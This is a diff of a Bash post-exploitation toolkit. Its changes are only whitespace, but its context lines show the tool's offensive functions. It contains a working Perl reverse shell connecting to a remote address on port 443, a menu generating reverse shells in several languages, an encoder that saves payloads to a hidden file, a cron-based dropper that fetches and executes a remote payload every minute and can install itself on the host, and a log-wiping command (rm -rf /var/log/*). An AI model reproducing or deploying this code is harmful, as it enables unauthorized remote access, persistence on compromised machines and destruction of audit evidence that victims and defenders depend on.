@@ -12,6 +12,7 @@ function display_output(){
 
 		}
 
+
 function genpayload() {
 
 		payloads=(
@@ -24,6 +25,7 @@ function genpayload() {
 		"perl -e 'use Socket;\$i=\"address\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
 		
 		)
+
 
 		function encshell() {
 
@@ -38,6 +40,7 @@ function genpayload() {
 				echo -e "Payload saved as `pwd`/.shell.sh"
 				read -p "Press enter to continue "
 		}
+
 
 		PS3="Select Reverse Shell payload: "
 		options=("Reverse Netcat Shell" "Reverse Bash Shell" "Reverse Python Shell" "Reverse PHP Shell" "Reverse Ruby Shell" "Reverse Perl Shell" "Return to main menu")
@@ -79,6 +82,7 @@ function genpayload() {
 		done
 }
 
+
 function cron() {
 
 		read -r -p "Enter server and payload file name for payload dropper (example http://server.com/shell.sh): " server
@@ -96,6 +100,7 @@ function cron() {
 				read -p "Press enter to continue "
 		}
 
+
 		function add2sys() {
 		
 				( crontab -l | grep -v -F "$server" ; echo "$cronjob" ) | crontab -
@@ -103,6 +108,8 @@ function cron() {
 				read -p "Press enter to continue "
 
 		}
+
+
 		PS3="Generate cron job payload dropper command or add cron job to this machine: "
 		options=("Generate crontab command to download and execute payload every minute" "Add cron job to this system to download and execute payload every minute" "Return to main menu")
 		select opt in "${options[@]}"
@@ -124,6 +131,7 @@ function cron() {
 
 }
 
+
 function clearlog() {
 
 		rm -rf /var/log/*
@@ -140,6 +148,7 @@ function clearlog() {
 		sleep 1.5
 
 }
+
 
 function info() {
 
